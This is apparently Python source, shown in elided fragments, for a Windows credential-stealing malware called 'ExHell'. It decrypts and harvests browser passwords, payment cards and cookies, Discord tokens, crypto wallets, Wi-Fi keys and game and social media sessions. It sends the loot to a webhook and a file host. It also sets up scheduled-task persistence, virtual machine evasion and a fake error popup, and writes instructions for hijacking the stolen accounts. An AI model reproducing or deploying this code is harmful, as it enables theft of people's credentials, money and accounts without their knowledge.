...
class SubModules:
    ...
    def CryptUnprotectData(
        encrypted_data: bytes, optional_entropy: str = None
    ) -> bytes:
        ...
        pDataIn = DATA_BLOB(
            len(encrypted_data),
            ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)),
        )
        pDataOut = DATA_BLOB()
        ...
        if ctypes.windll.Crypt32.CryptUnprotectData(
            ...
            None,
            ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None,
            None,
            None,
            0,
    ...
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            ...
            if version.startswith("v10") or version.startswith("v11"):
                ...
                password = password[
                    :-16
                ]  # Remove the authentication tag from the password
                backend = default_backend()
                cipher = Cipher(
                    algorithms.AES(EncryptedKey),
                    modes.GCM(iv, authentication_tag),
                    backend=backend,
                )
    ...
    def create_mutex(mutex_value) -> bool:
        ...
        )  # return if the mutex created successfully or not
...
class StealSystemInformation:
    async def FunctionRunner(self) -> None:
        try:
            ...
            print(
                f'[-] An error occured while starting processes at the same time for steal system information, Error code => "{error}"'
            )
    ...
    async def StealSystemInformation(self) -> None:
        try:
            ...
            print(
                f'[-] An error occured while stealing system information, error code => "{error}"'
            )
    ...
    async def StealProcessInformation(self) -> None:
        try:
            ...
            print(
                f'[-] An error occured while stealing process information, => error code "{error}"'
            )
    ...
    async def StealLastClipBoard(self) -> None:
        try:
            ...
            print(
                f'[-] An error occured while stealing "Last Clipboard Text", => error code "{error}"'
            )
    ...
    async def StealNetworkInformation(self) -> None:
        try:
            ...
            print(
                f'[-] An error occured while stealing network information, => error code "{error}"'
            )
    ...
    async def StealWifiInformation(self) -> None:
        try:
            ...
            wifi_profile_names = re.findall(
                r"All User Profile\s*: (.*)", decoded_profiles
            )
            for profile_name in wifi_profile_names:
                ...
                try:
                    ...
                    profile_output = stdout.decode(errors="ignore")
                wifi_passwords = re.search(
                    r"Key content\s*: (.*)", profile_output, re.IGNORECASE
                )

                Variables.Wifis.append(
                    (
                        profile_name,
                        (
                            wifi_passwords.group(1)
                            if wifi_passwords
            ...
            print(
                f'[-] An error occurred while stealing wifi information, error code => "{error}"'
            )
...
class Main:
    ...
    def list_profiles(self) -> None:
        directorys = {
            ...
            "Opera": os.path.join(
                self.RoamingAppData, "Opera Software", "Opera Stable"
            ),
            "Opera GX": os.path.join(
                self.RoamingAppData, "Opera Software", "Opera GX Stable"
            ),
            "Brave": os.path.join(
                ...
                if "Opera" in directory:
                    ...
                    for root, folders, files in os.walk(directory):
                        for folder in folders:
                            ...
                            if (
                                folder == "Default"
                                or folder.startswith("Profile")
                                or "Guest Profile" in folder
                            ):
    ...
    def ListFirefoxProfiles(self) -> None:
        try:
            directory = os.path.join(
                self.RoamingAppData, "Mozilla", "Firefox", "Profiles"
            )
            if os.path.isdir(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        ...
                        if (
                            file.endswith("cookies.sqlite")
                            or file.endswith("places.sqlite")
                            or file.endswith("formhistory.sqlite")
                        ):
    ...
    async def kill_browsers(self):
        ...
        process = await asyncio.create_subprocess_shell(
            "tasklist", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
                ...
                if "cookie" in files:
                    ...
                    for cookie in cookies:
                        self.FirefoxCookieList.append(
                            f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n"
                        )
                        if (
                            "instagram" in str(cookie[0]).lower()
                            and "sessionid" in str(cookie[1]).lower()
                        ):
                            asyncio.create_task(self.InstaSession(cookie[3], "Firefox"))
                        if (
                            "tiktok" in str(cookie[0]).lower()
                            and str(cookie[1]) == "sessionid"
                        ):
                            asyncio.create_task(
                                self.TikTokSession(cookie[3], "Firefox")
                            )
                        if (
                            "twitter" in str(cookie[0]).lower()
                            and str(cookie[1]) == "auth_token"
                        ):
                            asyncio.create_task(
                                self.TwitterSession(cookie[3], "Firefox")
                            )
                        if (
                            "reddit" in str(cookie[0]).lower()
                            and "reddit_session" in str(cookie[1]).lower()
                        ):
                            asyncio.create_task(
                                self.RedditSession(cookie[3], "Firefox")
                            )
                        if (
                            "spotify" in str(cookie[0]).lower()
                            and "sp_dc" in str(cookie[1]).lower()
                        ):
                            asyncio.create_task(
                                self.SpotifySession(cookie[3], "Firefox")
                            )
                        if "roblox" in str(
                            cookie[0]
                        ).lower() and "ROBLOSECURITY" in str(cookie[1]):
                            asyncio.create_task(
                                self.RobloxSession(cookie[3], "Firefox")
                            )
                        if (
                            "twitch" in str(cookie[0]).lower()
                            and "auth-token" in str(cookie[1]).lower()
                        ):
                            twitch_cookie = cookie[3]
                        if (
                            "twitch" in str(cookie[0]).lower()
                            and str(cookie[1]).lower() == "login"
                        ):
                            twitch_username = cookie[3]
                        if not twitch_username == None and not twitch_cookie == None:
                            asyncio.create_task(
                                self.TwitchSession(
                                    twitch_cookie, twitch_username, "Firefox"
                                )
                            )
                            twitch_username = None
                            twitch_cookie = None
                        if (
                            "account.riotgames.com" in str(cookie[0]).lower()
                            and "sid" in str(cookie[1]).lower()
                        ):
                            asyncio.create_task(
                                self.RiotGamesSession(cookie[3], "Firefox")
                            )
        except:
            pass
        else:
            ...
            for path in self.profiles_full_path:
                ...
                for card in cards:
                    if card[2] < 10:
                        ...
                        month = card[2]
                    Variables.Cards.append(
                        f"{SubModules.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n"
                    )
        except:
            pass
            ...
            for path in self.profiles_full_path:
                ...
                for cookie in cookies:
                    ...
                    Variables.Cookies.append(
                        f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n"
                    )
                    if (
                        "instagram" in str(cookie[0]).lower()
                        and "sessionid" in str(cookie[1]).lower()
                    ...
                    if (
                        ...
                        asyncio.create_task(
                            self.TwitterSession(dec_cookie, BrowserName)
                        )
                    if (
                        "reddit" in str(cookie[0]).lower()
                        and "reddit_session" in str(cookie[1]).lower()
                    ...
                    if (
                        ...
                        asyncio.create_task(
                            self.SpotifySession(dec_cookie, BrowserName)
                        )
                    if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(
                        cookie[1]
                    ):
                    ...
                    if not twitch_username == None and not twitch_cookie == None:
                        asyncio.create_task(
                            self.TwitchSession(
                                twitch_cookie, twitch_username, BrowserName
                            )
                        )
                        twitch_username = None
                        twitch_cookie = None
                    if (
                        ...
                        asyncio.create_task(
                            self.RiotGamesSession(dec_cookie, BrowserName)
                        )
        except:
            pass
    ...
    async def GetWallets(self, copied_path: str) -> None:
        try:
            ...
            wallet_local_paths = {
                ...
                "AtomicWallet": os.path.join(
                    self.RoamingAppData, "atomic", "Local Storage", "leveldb"
                ),
                "Guarda": os.path.join(
                    self.RoamingAppData, "Guarda", "Local Storage", "leveldb"
                ),
                "Coinomi": os.path.join(
                    self.RoamingAppData, "Coinomi", "Coinomi", "wallets"
                ),
            }
                    ...
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        if os.path.isdir(os.path.join(ext_path, wallet_addr)):
                            try:
                                ...
                                shutil.copytree(
                                    os.path.join(ext_path, wallet_addr),
                                    os.path.join(
                                        copied_path, "Wallets", file_name, wallet_addr
                                    ),
                                )
                            except:
                                continue
            for wallet_names, wallet_paths in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_paths):
                        shutil.copytree(
                            wallet_paths,
                            os.path.join(copied_path, "Wallets", wallet_names),
                        )
                except:
                    continue
        except:
        ...
        try:
            for path in self.profiles_full_path:
                ...
                if os.path.isfile(BookmarkData):
                    with open(
                        BookmarkData, "r", encoding="utf-8", errors="ignore"
                    ) as file:
                        data = json.load(file)
        ...
        try:
            for path in self.profiles_full_path:
                ...
                for download in downloads:
                    Variables.Downloads.append(
                        f"Downloaded URL: {download[0]}\nDownloaded Path: {download[1]}\n\n"
                    )
        except:
            pass
        ...
        try:
            ...
            if os.path.isdir(ubisoft_path):
                ...
                if found_ubisoft == True:
                    ...
                    with open(
                        os.path.join(copied_path, "How to Use", "How to Use.txt"),
                        "a",
                        errors="ignore",
                    ) as write_file:
                        write_file.write(
                            "https://t.me/OwlsToolz\n==============================================\n"
                        )
                        write_file.write(
                            "First, open this file path on your computer <%localappdata%\\Ubisoft Game Launcher>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run ubisoft"
                        )
        except:
            pass
    ...
    async def StealEpicGames(self, uuid: str) -> None:
        try:
            ...
            epic_path = os.path.join(
                self.LocalAppData, "EpicGamesLauncher", "Saved", "Config", "Windows"
            )
            ...
            if found_epic == True:
                with open(
                    os.path.join(copied_path, "How to Use.txt"), "a", errors="ignore"
                ) as write_file:
                    write_file.write(
                        "https://t.me/OwlsToolz\n==============================================\n"
                    )
                    write_file.write(
                        "First, open this file path on your computer <%localappdata%\\EpicGamesLauncher\\Saved\\Config\\Windows>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run epic games"
                    )
        except Exception as e:
            print(str(e))
        ...
        try:
            ...
            if found_growtopia == True:
                ...
                with open(
                    ...
                    write_file.write(
                        "First, open this file path on your computer <%localappdata%\\Growtopia>.\nReplace 'save.dat' with the stolen file."
                    )
        except:
            pass
        ...
        try:
            ...
            if os.path.exists(tg_path):
                    ...
                    try:
                        ...
                        if not dirs in black_listed_dirs:
                            ...
                            if os.path.isfile(_path):
                                shutil.copyfile(
                                    _path, os.path.join(copy_path, dir_name)
                                )
                ...
                if found_tg == True:
                    ...
                    with open(
                        os.path.join(copy_path, "How to Use", "How to Use.txt"),
                        "a",
                        errors="ignore",
                    ) as write_file:
                        write_file.write(
        ...
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    ...
                    "thumbnail": {"url": "https://hizliresim.com/mwyqeue"},
                }
                ...
                payload = {"username": "ExHell", "embeds": [embed_data]}
                headers = {"Content-Type": "application/json"}
                async with session.post(
                    webhook, json=payload, headers=headers
                ) as response:
                    pass
        except:
            pass
        else:
            Variables.RiotGameAccounts.append(
                f"Username : {username}\nEmail : {email}\nRegion : {region}\nLocale : {locale}\nCountry : {country}\nMFA Enabled : {mfa}\nCookie : {cookie}\n======================================================================\n"
            )

    async def InstaSession(self, cookie, browser: str) -> None:
        try:
            pp = "https://i.hizliresim.com/mwyqeue"
            bio = ""
            fullname = ""
            headers = {
            ...
            async with aiohttp.ClientSession(
                headers=headers, connector=aiohttp.TCPConnector(ssl=True)
            ) as session:
                async with session.get(infoURL) as response:
                    data = await response.json()
                async with session.get(
                    f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/"
                ) as response:
            ...
            Variables.InstagramAccounts.append(
    ...
    async def TikTokSession(self, cookie, browser: str) -> None:
        try:
            ...
            fields = [
                ...
                {
                    "name": "Profile URL",
                    "value": "``" + f"https://tiktok.com/@{username}" + "``",
                    "inline": False,
                },
                {
                    "name": "Tiktok Cookie",
            ...
            Variables.TikTokAccounts.append(
    ...
    async def TwitterSession(self, cookie, browser: str) -> None:
        try:
            ...
            fields = [
                ...
                {
                    "name": "Followers",
                    "value": "``" + str(req["followers_count"]) + "``",
                    "inline": True,
                },
                {
                    "name": "Following",
                    "value": "``" + str(req["friends_count"]) + "``",
                    "inline": True,
                },
                {
                    "name": "Tweets",
                    "value": "``" + str(req["statuses_count"]) + "``",
                    "inline": True,
                },
                {
                    "name": "Is Verified",
                    "value": "``" + str(req["verified"]) + "``",
                    "inline": True,
                },
                {
                    "name": "Created At",
                    "value": "``" + str(req["created_at"]) + "``",
                    "inline": True,
                },
                {
                    "name": "Biography",
            ...
            Variables.TwitterAccounts.append(
    ...
    async def TwitchSession(self, auth_token, username, browser: str) -> None:
        try:
            ...
            lang = data["language"]
            pp = "https://hizliresim.com/mwyqeue.jpg"
            try:
            ...
            Variables.TwtichAccounts.append(
        ...
        try:
            ...
            fields = [
                ...
                },
                {
                    "name": "Profile URL",
                    "value": "``"
                    + str(f"https://open.spotify.com/user/{username}")
                    + "``",
                    "inline": False,
                },
                {
            ...
            Variables.SpotifyAccounts.append(
    ...
    async def RedditSession(self, cookie, browser: str) -> None:
        try:
            ...
            fields = [
                ...
                {
                    "name": "Comment Karma",
                    "value": "``" + str(commentKarma) + "``",
                    "inline": True,
                },
                {
                    "name": "Total Karma",
                    "value": "``" + str(totalKarma) + "``",
                    "inline": True,
                },
                {"name": "Coins", "value": "``" + str(coins) + "``", "inline": True},
            ...
            Variables.RedditAccounts.append(
    ...
    async def RobloxSession(self, cookie, browser: str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(
                ...
                async with session.get(
                    "https://www.roblox.com/my/account/json", headers=headers
                ) as response:
                    res = await response.json()
                async with session.get(
                    f"https://economy.roblox.com/v1/users/{str(res['UserId'])}/currency",
                    headers=headers,
                ) as req:
                    res2 = await req.json()
                async with session.get(
                    f"https://thumbnails.roblox.com/v1/users/avatar?userIds={str(res['UserId'])}&size=420x420&format=Png&isCircular=false",
                    headers=headers,
                ) as req2:
                ...
                async with session.post(
                    webhook, json=payload, headers=headers2
                ) as response:
                    pass
        except:
            pass
        else:
            Variables.RobloxAccounts.append(
        ...
        try:
            discord_dirs = {
                "Discord": os.path.join(
                    self.RoamingAppData, "discord", "Local Storage", "leveldb"
                ),
                "Discord Canary": os.path.join(
                    self.RoamingAppData, "discordcanary", "Local Storage", "leveldb"
                ),
                "Lightcord": os.path.join(
                    self.RoamingAppData, "Lightcord", "Local Storage", "leveldb"
                ),
                "Discord PTB": os.path.join(
                    self.RoamingAppData, "discordptb", "Local Storage", "leveldb"
                ),
            }
            dirs = list()
            ...
            for directorys in dirs:
                ...
                if "cord" in directorys:  # extract tokens from discord
                    key = SubModules.GetKey(
                        directorys.replace(r"Local Storage\leveldb", "Local State")
                    )
                    for y in os.listdir(directorys):
                        ...
                        if full_path[-3:] in ["log", "ldb"]:
                            with open(
                                ...
                                for tokens in re.findall(
                                    r"dQw4w9WgXcQ:[^\"]*", files.read()
                                ):
                                    if tokens:
                                        enc_token = base64.b64decode(
                                            tokens.split("dQw4w9WgXcQ:")[1]
                                        )
                                        dec_token = SubModules.Decrpytion(
                                            enc_token, key
                                        )
                                        if not dec_token in full_tokens:
                                            full_tokens.append(dec_token)
                                            await self.ValidateTokenAndGetInfo(
                                                dec_token
                                            )
                                        else:
                                            continue
            ...
            async with aiohttp.ClientSession() as session:
                async with session.get(acc_info, headers=headers) as response:
                    if response.status == 200:
                        ...
                        badges = " ".join(
                            [flag[0] for flag in self.calc_flags(public_flags)]
                        )
                        premium_type = data.get("premium_type", "")
                        if avatar:
                            async with session.get(
                                f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}.png",
                                headers=headers,
                            ) as av:
                                if av.status == 200:
                        ...
                        async with session.get(
                            hq_friends_url, headers=headers
                        ) as response2:
            ...
            if data:
                ...
                fields = [
                    ...
                    },
                    {
                        "name": "Username",
                        "value": "``"
                        + str(f'{data["username"]}#{data["discriminator"]}')
                        + "``",
                        "inline": True,
                    },
                    {
                    ...
                    {
                        "name": "Badges",
                        "value": str(badges if badges != "" else "None"),
                        "inline": True,
                    },
                ]
                if hq_friends:
                ...
                async with aiohttp.ClientSession() as session:
                    ...
                    async with session.post(
                        ...
                        pass
                Variables.DiscordAccounts.append(
        ...
        try:
            ...
            for steam_paths in all_disks:
                ...
                if os.path.isfile(steam_paths):
                    with open(
                        steam_paths, "r", encoding="utf-8", errors="ignore"
                    ) as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(
                                ...
                                embed_data = {
                                    ...
                                    "url": "https://github.com/tola12pr/exhell",
                                    "color": 0,
                                    "footer": {"https://github.com/tola12pr/exhell"},
                                ...
                                fields = [
                                    ...
                                    {
                                        "name": "Timecreated",
                                        "value": "``" + str(timecreated) + "``",
                                        "inline": True,
                                    },
                                    {
                                        "name": "Player Level",
                                        "value": "``" + str(player_level) + "``",
                                        "inline": True,
                                    },
                                    {
                                        "name": "Profile URL",
    ...
    async def StealSteamSessionFiles(self, uuid: str) -> None:
        try:
            ...
            if os.path.isdir(steam_path):
                ...
                with open(
                    os.path.join(to_path, "How to Use.txt"),
                    "w",
                    errors="ignore",
                    encoding="utf-8",
                ) as file:
    ...
    async def WriteToText(self) -> None:
        try:
            ...
            process = await asyncio.create_subprocess_shell(
                f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}",
                cwd=filePath,
                shell=True,
            )
            await process.communicate()
            ...
            if processList:
                with open(
                    os.path.join(filePath, "process_info.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if Variables.ClipBoard:
                with open(
                    os.path.join(filePath, "last_clipboard.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if self.FirefoxCookieList:
                with open(
                    os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if self.FirefoxHistoryList:
                with open(
                    os.path.join(filePath, "Browsers", "Firefox", "History.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if self.FirefoxAutofiList:
                with open(
                    os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if password_list:
                with open(
                    os.path.join(filePath, "Browsers", "Passwords.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if card_list:
                with open(
                    os.path.join(filePath, "Browsers", "Cards.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if cookie_list:
                with open(
                    os.path.join(filePath, "Browsers", "Cookies.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if history_list:
                with open(
                    os.path.join(filePath, "Browsers", "Historys.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if autofill_list:
                with open(
                    os.path.join(filePath, "Browsers", "Autofills.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if bookmark_list:
                with open(
                    os.path.join(filePath, "Browsers", "Bookmarks.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if download_list:
                with open(
                    os.path.join(filePath, "Browsers", "Downloads.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if riot_acc:
                with open(
                    os.path.join(filePath, "Sessions", "riot_games.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if insta_acc:
                with open(
                    os.path.join(filePath, "Sessions", "instagram_sessions.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if tiktok_acc:
                with open(
                    os.path.join(filePath, "Sessions", "tiktok_sessions.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if twitter_acc:
                with open(
                    os.path.join(filePath, "Sessions", "twitter_sessions.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if reddit_acc:
                with open(
                    os.path.join(filePath, "Sessions", "reddit_sessions.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if twitch_acc:
                with open(
                    os.path.join(filePath, "Sessions", "twitch_sessions.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if spotify_acc:
                with open(
                    os.path.join(filePath, "Sessions", "spotify_sessions.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if roblox_acc:
                with open(
                    os.path.join(filePath, "Sessions", "roblox_sessions.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if steam_acc:
                with open(
                    os.path.join(filePath, "Sessions", "steam_sessions.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if Variables.DiscordAccounts:
                with open(
                    os.path.join(filePath, "Tokens", "discord_accounts.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if Variables.FullTokens:
                with open(
                    os.path.join(filePath, "Tokens", "full_tokens.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if Variables.ValidatedTokens:
                with open(
                    os.path.join(filePath, "Tokens", "validated_tokens.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if Variables.Wifis:
                with open(
                    os.path.join(filePath, "wifi_info.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
                    ...
                    for profile_name, profile_password in Variables.Wifis:
                        file.write(
                            f"WiFi Profile: {str(profile_name)}\nPassword: {str(profile_password)}\n\n"
                        )
            if Variables.SystemInfo:
                with open(
                    os.path.join(filePath, "system_info.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
            ...
            if Variables.Network:
                with open(
                    os.path.join(filePath, "network_info.txt"),
                    "a",
                    encoding="utf-8",
                    errors="ignore",
                ) as file:
    ...
    async def SendContains(self) -> None:
        try:
            ...
            fields = [
                {
                    "name": "Passwords",
                    "value": "```" + str(password_keys) + "```",
                    "inline": False,
                },
                {
                    "name": "Autofills",
                    "value": "```" + str(autofill_keys) + "```",
                    "inline": False,
                },
                {
                    "name": "Cookies",
                    "value": "```" + str(cookie_keys) + "```",
                    "inline": False,
                },
            ]
            embed_data["fields"] = fields
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***ExHell***",
            "description": f"***ExHell Full Info***",
            "url": "https://t.me/OwlsToolz",
            "color": 0,
            "footer": {"https://github.com/tola12pr/exhell"},
            "thumbnail": {"url": "https://hizliresim.com/mwyqeue.jpg"},
        ...
        fields = [
            {
                "name": "Password",
                "value": "``" + str(len(Variables.Passwords)) + "``",
                "inline": True,
            },
            {
                "name": "Card",
                "value": "``" + str(len(Variables.Cards)) + "``",
                "inline": True,
            },
            {
                "name": "Cookie",
                "value": "``"
                + str(len(Variables.Cookies) + len(self.FirefoxCookieList))
                + "``",
                "inline": True,
            },
            {
                "name": "History",
                "value": "``"
                + str(len(Variables.Historys) + len(self.FirefoxHistoryList))
                + "``",
                "inline": True,
            },
            {
                "name": "Download",
                "value": "``" + str(len(Variables.Downloads)) + "``",
                "inline": True,
            },
            {
                "name": "Bookmark",
                "value": "``" + str(len(Variables.Bookmarks)) + "``",
                "inline": True,
            },
            {
                "name": "Autofill",
                "value": "``"
                + str(len(Variables.Autofills) + len(self.FirefoxAutofiList))
                + "``",
                "inline": True,
            },
            {
                "name": "Tokens",
                "value": "``" + str(len(Variables.FullTokens)) + "``",
                "inline": True,
            },
            {
                "name": "Instagram",
                "value": "``" + str(len(Variables.InstagramAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "Twitter",
                "value": "``" + str(len(Variables.TwitterAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "TikTok",
                "value": "``" + str(len(Variables.TikTokAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "Twitch",
                "value": "``" + str(len(Variables.TwtichAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "Reddit",
                "value": "``" + str(len(Variables.RedditAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "Spotify",
                "value": "``" + str(len(Variables.SpotifyAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "Riot Game's",
                "value": "``" + str(len(Variables.RiotGameAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "Roblox",
                "value": "``" + str(len(Variables.RobloxAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "Steam",
                "value": "``" + str(len(Variables.SteamAccounts)) + "``",
                "inline": True,
            },
            {
                "name": "Wifi",
                "value": "``" + str(len(Variables.Wifis)) + "``",
                "inline": True,
            },
            {
                "name": "FireFox?",
                "value": "``" + str(self.FireFox) + "``",
                "inline": True,
            },
        ]
        embed_data["fields"] = fields
        async with aiohttp.ClientSession(
            ...
            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 15:
                ...
                payload.add_field(
                    "file", dosya_verisi, filename=os.path.basename(filePath + ".zip")
                )
                ...
                if succes != None:
                    ...
                    print("file cannot uploaded to GoFile.")
            try:
                    ...
                    for folder_path, _, files in os.walk(source_path):
                        for file_name in files:
                            ...
                            if (
                                ...
                                or any(
                                    keyword in file_name.lower() for keyword in keywords
                                )
                            ):
                                ...
                                destination_folder_path = os.path.join(
                                    destination_directory, source_folder_name
                                )
            ...
            if not uploaded_url == None:
                async with aiohttp.ClientSession() as session:
                    ...
                    fields2 = [
                        {
                            "name": "Download Link",
                            "value": f"[Files.zip]({uploaded_url})",
                            "inline": True,
                        }
                    ]
                    embed_data2["fields"] = fields2
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath: str = os.path.join(
            self.LocalAppData, "ExhellUpdateService", "Exhell"
        )
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath):  # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("Exhell", ""))  # Create Directory
                shutil.copyfile(
                    self.CurrentFile, self.ToPath
                )  # copy to current file to local appdata directory
                process = await asyncio.create_subprocess_shell(
    ...
    async def SchtaskStartup(self) -> None:  # schtask method for startup
        try:
            ...
            )  # checking if the file on schtask or not
            if not stdout:  # if the file not on schtasks
                if (
                    self.Privalage
                ):  # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "ExhellUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "ExhellaUpdateService2" /tr "{self.ToPath}"'
                        process = await asyncio.create_subprocess_shell(
                            onLogonCommand,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                    ...
                    if (
                        result > 32
                    ):  # if the user give the admin req close the normal code for execute the admin priv code
                        os._exit(0)
    ...
    async def FolderStartup(self):  # folder method for startup
        try:
            if (
                self.Privalage
            ):  # if the code running admin privilage, copy to common startup path
                if os.path.isfile(
                    r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Exhell"
                ):
...
class AntiVM:
    ...
    async def CheckGpu(self) -> bool:
        try:
            ...
            return any(
                x.lower() in decoded_output[2].strip().lower()
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(
            os.getenv("LOCALAPPDATA"), "ExhellUpdateService", "Exhell"
        ):
            title = (
                FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22")
            )  # Sets the title of the fake error
            message = (
                FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22")
            )  # Sets the message of the fake error
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(
                message, title, FakeError[1][2]
            )
...
if __name__ == "__main__":
    if os.name == "nt":
        if not SubModules.create_mutex("ExHell | Stealar | on top |"):
            ...
            print(
                f"\nThe code executed on: {str(time.time() - start_time)} second",
                end="",
            )
    else:
